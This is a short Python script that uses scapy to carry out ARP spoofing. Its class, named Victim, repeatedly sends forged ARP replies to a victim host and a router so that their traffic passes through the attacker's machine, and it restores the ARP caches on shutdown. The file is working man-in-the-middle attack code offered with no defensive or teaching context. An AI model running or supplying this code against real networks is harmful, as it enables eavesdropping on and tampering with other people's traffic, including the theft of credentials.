import os
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy import all as scapy
from threading import Thread

class Victim(object):

    def __init__(self, targets, target_macs):
        self.routerIP = targets[1]
        self.victimIP = targets[0]
        self.routerMAC = target_macs[1]
        self.victimMAC = target_macs[0]
        self.run = True
        self.targets = targets
        self.target_macs = target_macs


    def MiddleMan(self):
        while self.run:
            self.arp(self.targets[0], self.targets[1], self.target_macs[0])
            self.arp(self.targets[1], self.targets[0], self.target_macs[1])
            time.sleep(10)

    def arp(self, dstip, srcip, dstmac, srcmac=None):
        kwargs = {
                'op': 2,
                'pdst': dstip,
                'psrc': srcip,
                'hwdst': dstmac,
                }
        if srcmac is not None:
            kwargs['hwsrc'] = srcmac
        scapy.send(scapy.ARP(**kwargs), count=5, iface="enp0s25")

    def shutdown(self):
        self.run = False
        if len(self.target_macs)!=2:
            return

        self.arp(self.targets[0], self.targets[1], self.target_macs[0],
                self.target_macs[1])
        self.arp(self.targets[1], self.targets[0], self.target_macs[1],
                self.target_macs[0])
